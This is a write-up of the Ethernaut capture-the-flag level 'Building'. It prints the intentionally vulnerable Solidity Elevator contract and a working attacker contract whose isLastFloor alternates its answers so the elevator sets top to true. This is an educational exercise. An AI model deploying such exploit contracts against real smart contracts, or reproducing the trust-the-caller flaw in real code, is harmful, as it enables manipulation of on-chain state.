# Level 11: Building

This is the level 11 of [Ethernaut](https://ethernaut.openzeppelin.com/) game.

## Pre-requisites
- Solidity [interfaces](https://docs.soliditylang.org/en/v0.8.10/contracts.html#interfaces)

## Hack

Given contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

`player` has to set `top` to `true` i.e. have to reach top of the building.

But `Elevator` won't let you.... if you comply by the `Building` so religiously. So let's not get so disciplined ;)

Alright so, `goTo` calls the contract at `msg.sender` address that implements `Building` interface to determined if `_floor` is last floor.

Okay, then we'll create a contract `MyBuilding` that inherits `Building` and therefore implements `isLastFloor`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

interface IElevator {
    function goTo(uint _floor) external;
}

contract MyBuilding is Building {
    bool public last = true;

    function isLastFloor(uint _n) override external returns (bool) {
        last = !last;
        return last;
    }

    function goToTop(address _elevatorAddr) public {
        IElevator(_elevatorAddr).goTo(1);
    }
}
```

But...although we did implement `isLastFloor` we won't use `_floor` param anywhere to determine if it's last floor. We are not obliged to anyway ;)

We just alternate between returning `true` and `false`, so that 1st call will return `false` and 2nd call returns `true` and so on.

Simply call `goToTop` of `MyBuilding`, with `contract.address` of instance. That'll trigger `Elevator` to call `isLastFloor` of our contract - `MyBuilding`. And since second call sets `top` variable, it is set to `true`.

Verify in console:
```javascript
await contract.top()

// Output: true
```

Started from the bottom now we here (`top`) !

_Learned something awesome? Consider starring the [github repo](https://github.com/theNvN/ethernaut-openzeppelin-hacks)_ 😄

_and following me on twitter [here](https://twitter.com/the_nvn)_ 🙏

